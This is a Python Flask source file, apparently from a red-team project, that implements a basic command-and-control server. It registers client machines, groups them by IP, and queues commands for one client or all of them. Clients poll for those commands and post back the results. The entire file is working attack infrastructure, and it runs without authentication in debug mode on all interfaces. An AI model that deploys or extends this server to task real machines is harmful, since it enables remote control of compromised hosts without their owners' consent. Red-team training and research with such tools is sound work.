from flask import Flask, request, jsonify, render_template
# import requests
from datetime import datetime
from termcolor import colored
from ipaddress import ip_address, ip_network

SERVER_URL = "http://127.0.0.1:5005"
app = Flask(__name__)
print("Drew was here")

#TODO: https?

client_commands = {} # 'client_id': 'command', 'timestamp' --> to handle commands for specific clients
clients = [] # just to see what clients we got rn
groups = {}


@app.route('/home')
def home():
    return render_template('home.html')


@app.route('/input-command', methods=['GET', 'POST'])
def input():
    command_input = request.form.get('command')
    try:
        client_id, cmd = command_input.split(maxsplit=1) # splits it at only first occurrence of whitespace. so fire
        print("!!!!CLIENT ID: " + client_id)
        print("!!!!CMD: " + cmd)
        if client_id == "all":
            for c in client_commands:
                client_commands[c] = {'command': cmd, 'timestamp': datetime.now()}
        else: # if client is specified
            client_commands[client_id] = {'command': cmd, 'timestamp': datetime.now()}
    except ValueError:
        return render_template('home.html', message="invalid input")
    return render_template('home.html', message=f"Command received for {client_id}: {cmd}") # idk


# handle commands to specific clients
# syntax: [client_id/"all"] [command]
@app.route('/command', methods=['GET'])
def send_command():
    client_id = request.args.get('client_id') # defaults to None apparently?
    cmd = client_commands.get(client_id)

    if client_id in clients: # if valid client id was parsed
        # print("valid client")
        cmd_info = client_commands.get(client_id, None)
        if cmd_info and ((datetime.now() - cmd_info['timestamp']).total_seconds() < 5): # if command is valid and was issued within the last 5 secs
            # print("sup")
            return jsonify(status="sent", client_id=client_id, command=cmd_info['command']) # send to a specific client
        else:
            return jsonify(status="no command", client_id=client_id)
    return jsonify(status="sent", command=cmd) # otherwise send to all
    # return jsonify(status="unsent", command="") # invalid client_id


@app.route('/register-client', methods=['GET'])
def register_client():
    # client_id = request.remote_addr # ok just found out u could do this
    client_id = request.args.get('client_id') # retrieves the value associated with the key 'client_id' from the query string, or None if it does not exist
    
    # client_subnet = str(ip_network(f"{client_id}/24", strict=False))  # extract subnet (/24)
    group = client_id.split('.')[-1] # last octet
    if group not in groups:
        groups[group] = []
    if client_id not in groups:
        groups[group].append(client_id)
    print(groups)

    if client_id not in clients:
        clients.append(client_id)
    if client_id not in client_commands:
        client_commands[client_id] = {"command": None, "timestamp": datetime.min}
    return jsonify(status="client registered", client_id=client_id)


@app.route('/', methods=['POST']) # callbacks
def command_result():
    result = request.json.get('result') # GET from client
    # wtf is a result rename that
    status = request.args.get('status')
    print(colored("\nclient command result:\n" + result + "\n", "blue"))
    # print("\nclient command result:\n" + result + "\n")
    return jsonify({"status": status})


@app.route('/clients')
def show_clients():
    return clients


if __name__ == '__main__':
    # app.run(debug=True, host='0.0.0.0', port=5005, threaded=True, ssl_context=('/Users/leahk/workspace/projects/redteam/C2/cert.pem', '/Users/leahk/workspace/projects/redteam/C2/key.pem'))
    app.run(debug=True, host='0.0.0.0', port=5005, threaded=True)
    # app.run(host='127.0.0.1', port=5000, threaded=True)